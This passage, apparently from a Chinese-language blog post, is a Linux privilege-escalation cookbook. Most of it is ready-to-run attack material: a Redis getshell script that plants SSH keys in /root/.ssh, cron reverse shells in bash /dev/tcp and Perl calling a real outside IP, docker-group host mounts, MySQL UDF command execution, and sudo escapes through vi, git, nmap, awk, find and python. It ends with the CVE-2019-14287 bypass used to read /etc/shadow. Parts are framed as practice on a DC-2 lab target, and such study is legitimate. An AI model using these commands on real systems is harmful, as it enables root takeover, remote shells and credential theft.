+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543411.png" alt></p>
+<p>可以通过cat 读取一下这个文件怎么用。攻击机器开启一个http 服务：</p>
+<pre><code class="hljs scss">python -m SimpleHTTPServer</code></pre>
+<p>将exploit 用 wget 下载到可执行的<code>/tmp/</code>目录下。然后执行<code>sh</code>&nbsp;文件。最后在<code>/etc/</code>目录下执行<code>./rootshell</code>&nbsp;即可get root shell。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543412.png" alt></p>
+<p>还有之前爆的sudo 提权，CVE-2019-14187。只不过比较鸡肋。</p>
+<blockquote>
+<p><strong>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</strong></p>
+</blockquote>
+<p><strong>利用前提</strong></p>
+<ol>
+<li>sudo -v &lt; 1.8.28</li>
+<li>知道当前用户的密码</li>
+<li>当前用户存在于sudo权限列表<br>
+复现参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ethtool/p/12176730.html">https://www.cnblogs.com/ethtool/p/12176730.html</a>----感觉解释的不清晰，下文在做探讨</li>
+</ol>
+<h2 id="第三方服务提权">第三方服务提权</h2>
+<h3 id="docker-组提权">Docker 组提权</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/103666135">https://blog.csdn.net/qq_41918771/article/details/103666135</a></p>
+<blockquote>
+<p>docker 组内用户执行命令的时候会自动在所有命令前添加 sudo。因为设计或者其他的原因，Docker 给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）。默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker<br>
+组用户访问 Docker。给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。</p>
+</blockquote>
+<p>普通用户执行：即可获得root权限。</p>
+<pre><code class="hljs scss">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543413.png" alt><br>
+参数 -v 将容器外部的目录 / ，挂载到容器内部 /hostOS</p>
+<p>这个容器的启动脚本是 <a target="_blank" rel="noopener" href="http://exploit.sh">exploit.sh</a>，主要内容是：chroot 到容器的 /hostOS （也就是宿主机的 /），然后获取到宿主机的 root 权限。</p>
+<p>建议步骤可以概括为下面所阐述内容</p>
+<pre><code class="hljs scss">docker组的本质就是无密码root身份访问主机文件
+
+利用命令docker run -v /root:/mnt -it ubuntu可以创建一个新的docker实例，以主机的/root目录作为系统卷启动。
+
+容器启动后可以查看该目录内容或添加ssh密钥，更改为其他目录均可，可以结合/etc/shadow破解或添加sudoers等。</code></pre>
+<h3 id="mysql-udf-提权">MySQL UDF 提权</h3>
+<p><code>ps -aux | grep root 列出以root身份运行的服务。</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543414.png" alt></p>
+<p>可以看到mysql服务以root用户组运行，那么我们可以使用将作为root用户执行的MySQL Shell执行任意命令。</p>
+<pre><code class="hljs scss">show variables like '%compile%';
+show variables like 'plugin%';</code></pre>
+<p>不过这里有一个限制，<code>show global variables like 'secure%'</code>&nbsp;secure_file_priv 没有具体的值（即能够导出/写入文件</p>
+<blockquote>
+<p>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>
+当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br>
+当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p>
+</blockquote>
+<p>MSF 中的&nbsp;<code>exploit/multi/mysql/mysql_udf_payload</code>&nbsp;漏洞利用模块可以进行UDF提权</p>
+<p>使用&nbsp;<code>select sys_exec('whoami');</code>&nbsp;或&nbsp;<code>select sys_eval('whoami');</code>&nbsp;来执行系统命令</p>
+<p>或者手工上传udf<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543416.png" alt></p>
+<h3 id="redis-批量-getshell">Redis 批量 getshell</h3>
+<blockquote>
+<p>如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p>
+</blockquote>
+<p>相关利用exp：<a target="_blank" rel="noopener" href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py</a></p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-comment"># project = https://github.com/Xyntax/POC-T</span>
+<span class="hljs-comment"># author = i@cdxy.me</span>
+
+<span class="hljs-string">"""</span>
+<span class="hljs-string">redis getshell expliot (ssh authorized_keys)</span>
+<span class="hljs-string">"""</span>
+
+<span class="hljs-keyword">import</span> redis
+<span class="hljs-keyword">import</span> paramiko
+<span class="hljs-keyword">from</span> plugin.util <span class="hljs-keyword">import</span> host2IP
+<span class="hljs-keyword">from</span> plugin.util <span class="hljs-keyword">import</span> randomString
+<span class="hljs-keyword">from</span> plugin.util <span class="hljs-keyword">import</span> checkPortTcp
+<span class="hljs-keyword">from</span> paramiko.ssh_exception <span class="hljs-keyword">import</span> SSHException
+
+public_key = <span class="hljs-string">'ssh-rsa ====='</span>
+
+private_key = <span class="hljs-string">"""</span>
+<span class="hljs-string">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="hljs-string">=====</span>
+<span class="hljs-string">-----END RSA PRIVATE KEY-----</span>
+<span class="hljs-string">"""</span>
+
+<span class="hljs-keyword">import</span> time
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params">url</span>):
+    url = host2IP(url)
+    ip = url.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">0</span>]
+    port = <span class="hljs-built_in">int</span>(url.split(<span class="hljs-string">':'</span>)[-<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">':'</span> <span class="hljs-keyword">in</span> url <span class="hljs-keyword">else</span> <span class="hljs-number">6379</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> checkPortTcp(ip, <span class="hljs-number">22</span>):
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        r = redis.Redis(host=ip, port=port, db=<span class="hljs-number">0</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'redis_version'</span> <span class="hljs-keyword">in</span> r.info():
+            key = randomString(<span class="hljs-number">10</span>)
+            r.<span class="hljs-built_in">set</span>(key, <span class="hljs-string">'\n\n'</span> + public_key + <span class="hljs-string">'\n\n'</span>)
+            r.config_set(<span class="hljs-string">'dir'</span>, <span class="hljs-string">'/root/.ssh'</span>)
+            r.config_set(<span class="hljs-string">'dbfilename'</span>, <span class="hljs-string">'authorized_keys'</span>)
+            r.save()
+            r.delete(key)  <span class="hljs-comment"># 清除痕迹</span>
+            r.config_set(<span class="hljs-string">'dir'</span>, <span class="hljs-string">'/tmp'</span>)
+            time.sleep(<span class="hljs-number">5</span>)
+            <span class="hljs-keyword">if</span> testConnect(ip, <span class="hljs-number">22</span>):
+                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">except</span> Exception:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">testConnect</span>(<span class="hljs-params">ip, port=<span class="hljs-number">22</span></span>):
+    <span class="hljs-keyword">try</span>:
+        s = paramiko.SSHClient()
+        s.load_system_host_keys()
+        s.connect(ip, port, username=<span class="hljs-string">'root'</span>, pkey=private_key, timeout=<span class="hljs-number">10</span>)
+        s.close()
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">except</span> Exception, e:
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(e) == SSHException:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre>
+<blockquote>
+<p>一般情况情况下，内核漏洞或者第三方服务来提权的情况更多。</p>
+</blockquote>
+<h2 id="抓取密码提权">抓取密码提权</h2>
+<ul>
+<li>密码Hash破解
+<ul>
+<li>hashcat 6.1.1</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></li>
+<li><a target="_blank" rel="noopener" href="https://samsclass.info/123/proj10/p12-hashcat.htm">https://samsclass.info/123/proj10/p12-hashcat.htm</a></li>
+</ul>
+</li>
+<li>密码Hash嗅探
+<ul>
+<li>mimipenguin 桌面版</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></li>
+</ul>
+</li>
+</ul>
+<p>Hash破解无非就是获取到某种加密方式的root之类高权限的用户密码，用hashcat破解即可：典型的就是shadow文件中的hash了</p>
+<p>至于Hash嗅探，就是用工具，对流经攻击者本地计算机或者是攻击者控制的受害机，与那些攻击者要攻击的目标之间的网络流量，进行分析抓取，抓取到其中的明文或者可破解密文流量（可能有密码，用户名之类的信息），之后进行破解即可。</p>
+<h2 id="计划任务提权">计划任务提权</h2>
+<p>利用原理：<br>
+- 当 /bin/sh指向/bin/dash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹： <code>* * * * * root bash -c "bash -i &gt;&amp;/dev/tcp/106.13.124.93/2333 0&gt;&amp;1</code> 这样弹shell的时候不知道为什么很慢，耐心等等</p>
+<pre><code class="hljs scss">- */<span class="hljs-number">1</span> * * * * root perl -e 'use Socket;<span class="hljs-variable">$i</span>="<span class="hljs-number">106.13</span><span class="hljs-selector-class">.124</span><span class="hljs-selector-class">.93</span>";<span class="hljs-variable">$p</span>=<span class="hljs-number">2333</span>;<span class="hljs-built_in">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));<span class="hljs-built_in">if</span>(connect(S,sockaddr_in($p,inet_aton($i)))){<span class="hljs-built_in">open</span>(STDIN,"&gt;&amp;S");<span class="hljs-built_in">open</span>(STDOUT,"&gt;&amp;S");<span class="hljs-built_in">open</span>(STDERR,"&gt;&amp;S");<span class="hljs-built_in">exec</span>("/bin/sh -i");};'</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543417.png" alt><br>
+比如：<code>1 0 * * * printf “” &gt; /var/log/apache/error_log</code></p>
+<p>前五个数字值表示执行cronjob的时间。现在让我们了解五个数字值。</p>
+<ol>
+<li>分钟–第一个值表示介于0到59之间的分钟范围，而*表示任何分钟。</li>
+<li>小时–第二个值表示小时范围在0到24之间，*表示任何小时。</li>
+<li>月中的某天–第三个值表示月中的某日，范围是1到31，*表示任何一天。</li>
+<li>月–第四个值表示1到12之间的月份范围，*表示任何月份。</li>
+<li>星期几–第五个值表示从星期天开始的星期几，介于0到6之间，*表示星期几。</li>
+</ol>
+<p>举个ubuntu计划任务提权的例子：</p>
+<p>当获取一个linux普通用户的时，查看计划任务：cat /etc/crontab</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543418.png" alt></p>
+<p>crontab -l 查看当前用户命令</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543419.png" alt></p>
+<p>/var/spool/cron/crontabs/root 这个目录是root任务文件 默认是：不是root权限看不到</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543420.png" alt></p>
+<p>可以选择查看系统日志：<code>tail -f /var/log/syslog</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543421.png" alt></p>
+<p>查看日志文件 发现root每一分钟会执行一次 cleanup.py文件</p>
+<p>修改内容 反弹shell本地监听：nc -lvnp 6666<br>
+<code>bash -i &gt;&amp; /dev/tcp/192.168.0.109/6666 0&gt;&amp;1</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543422.png" alt></p>
+<h2 id="sudo提权">SUDO提权</h2>
+<p>sodo 全称 Substitute User and Do，用来临时赋予root权限运行某个程序，是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非root的用户运行只有root才有权限执行的命令。</p>
+<p>sudo 的执行原理： <strong>普通用户执行命令时，首先检查/var/run/sudo/目录下是否有用户时间戳，centos检查/var/db/sudo/目录，并检查是否过期。</strong></p>
+<p><strong>如果时间戳过期，就需要输入当前用户的密码。输入后检查/etc/sudoers配置文件，查看用户是否有sudo权限，如果有，执行sudo命令并返回结果，然后退出sudo返回到普通用户的shell环境。</strong></p>
+<p>而在/etc/sudoers中设置可执行sudo指令的用户。默认只有root。</p>
+<p>常见的命令有（不限于这些）：vi、more、git、less、nmap</p>
+<p>是不是每一个新创建的用户都可以使用sudo提升命令的权限呢？如果不是那么哪些用户可以使用此命令呢？要想使一个用户具有使用sudo的能力，需要让root用户将其名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息注册到/etc/sudoers文件中，即完成对该用户的授权（此时该用户称为“sudoer”）才可以。</p>
+<p>当一般用户执行特殊权限时，在命令前加上 sudo，此时系统会让你输入密码以确认终端机前操作的是你本人，确认后系统会将该命令的进程以超级用户的权限运行。</p>
+<p>在一定的时间段内，再次执行sudo的命令时不再询问密码，超出此时间段（一般为5分钟）后需要再次输入密码。</p>
+<p>环境：DC-2靶机，基于Debian3.16，已经拥有⼀个可以⽤ssh连接的低权限账⼾jerry，要提升⾄root权限。</p>
+<p>sudo -l 可以查看当前⽤⼾可以使⽤的sudo命令</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543423.png" alt><br>
+这个例子中：修改了该系统sudo配置，使得DC-2只能通过sudo使⽤这四个命令，实际环境中不⼀定会这么明显显⽰可⽤命令，某些配置也是可以使⽤这⼏个命令的，如果对sudo机制不熟悉，可以直接使⽤sudo+命令 测试是否可⽤。</p>
+<h3 id="sudo-vi提权">sudo vi提权</h3>
+<p>vi是linux中的⼀个⽂本编辑器，其在底线命令⾏模式下，可以执⾏命令打开⼀个shell<br>
+<code>sudo vi test.txt</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543424.png" alt><br>
+进⼊后即为底线命令模式，输⼊:!/bin/bash，即可打开⼀个⽤⼾为root的shell<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543425.png" alt></p>
+<h3 id="sudo-more和-less提权">sudo more和 less提权</h3>
+<p>这两者命令步骤一致<br>
+<code>sudo more flag4.txt</code><br>
+注：flag4.txt是当前⽬录中的⼀个⽂件，如果没有这个⽂件，可以先创建⼀个，该⽂件的⾏数尽量多⼀点，保证终端中⼀⻚⽆法显⽰完</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543426.png" alt></p>
+<p>输⼊!/bin/bash，即可打开⼀个⽤⼾为root的shell</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543427.png" alt></p>
+<h3 id="sudo-git-提权">sudo git 提权</h3>
+<p>sudo git提权与sudo vi类似，不过git使⽤的是帮助信息未显示完全可以输⼊命令打开shell</p>
+<pre><code class="hljs shell">sudo git -p help #不知道为什么要写成这样，只有这样写才可以</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543428.png" alt><br>
+注意：⼀定要把终端窗⼝上下拉窄⼀些，使得回显信息⼀⻚⽆法显⽰完全</p>
+<p>输⼊!/bin/bash，即可打开⼀个⽤⼾为root的shell</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543429.png" alt></p>
+<h3 id="sudo-nmap-提权">sudo nmap 提权</h3>
+<pre><code class="hljs scss">echo "os<span class="hljs-selector-class">.execute</span>('/bin/bash')" &gt; /tmp/shell<span class="hljs-selector-class">.nse</span> 
+<span class="hljs-comment">// 将os.execute('/bin/bash')"写入文件shell.nse</span>
+sudo nmap <span class="hljs-attr">--script</span>=/tmp/shell<span class="hljs-selector-class">.nse</span> #使用sudo nmap执行脚本shell<span class="hljs-selector-class">.nse</span></code></pre>
+<p>继续添加一些命令继续测试</p>
+<pre><code class="hljs scss">hacker  <span class="hljs-attribute">ALL</span>=(root) NOPASSWD: /usr/bin/awk
+hacker  ALL=(root) NOPASSWD: /usr/bin/vim
+hacker  ALL=(root) NOPASSWD: /usr/bin/man
+hacker  ALL=(root) NOPASSWD: /usr/bin/apache2
+hacker  ALL=(root) NOPASSWD: /usr/bin/less
+hacker  ALL=(root) NOPASSWD: /bin/more
+hacker  ALL=(root) NOPASSWD: /usr/bin/find
+hacker  ALL=(root) NOPASSWD: /usr/bin/zip</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543430.png" alt></p>
+<p>假设获取了一个普通用户hacker的权限，接着利用sudo进行提权，这里我们先切换到hacker用户</p>
+<pre><code class="hljs scss">sudo useradd -m hacker  <span class="hljs-comment">//创建新用户</span>
+sudo passwd hacker    <span class="hljs-comment">//给用户设置密码</span>
+su hacker  <span class="hljs-comment">//转到新用户下</span></code></pre>
+<h3 id="sudo-awk-提权">sudo awk 提权</h3>
+<pre><code class="hljs scss">sudo awk 'BEGIN{<span class="hljs-built_in">system</span>("/bin/bash")}'</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543431.png" alt></p>
+<h3 id="sudo-find-提权">sudo find 提权</h3>
+<pre><code class="hljs scss">sudo find . -exec /bin/sh \; -quit</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543432.png" alt></p>
+<h3 id="sudo-ed-提权">sudo ed 提权</h3>
+<pre><code class="hljs scss">sudo ed   <span class="hljs-comment">//之后     </span>
+!/bin/sh</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543433.png" alt></p>
+<h3 id="sudo-python-提权">sudo python 提权</h3>
+<p><code>sudo python -c 'import pty;pty.spawn("/bin/bash")'</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543434.png" alt><br>
+<code>cseroad ALL=(ALL:ALL) NOPASSWD:/usr/bin/apt-get</code></p>
+<ul>
+<li>cseroad表示用户名（以%开头的表示：授权的组）</li>
+<li>第一个 ALL 指示允许从任何终端访问sudo</li>
+<li>第二个 (ALL:ALL)指示sudo命令被允许任意用户、任意组执行</li>
+<li>第三个 NOPASSWD 表示不需要输入密码而可以sudo执行的命令</li>
+<li>最后一部分代表可以使用的命令</li>
+</ul>
+<h3 id="cve-2019-14287提权">CVE-2019-14287提权</h3>
+<p>影响范围：sudo 1.8.28 之前的所有版本<br>
+sudoers配置如下：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543435.png" alt></p>
+<p>输入<code>sudo -u#-1 vim或者sudo -u#4294967295 vim</code><br>
+进入到vim之后，在命令行模式下读取/etc/shadow文件<br>
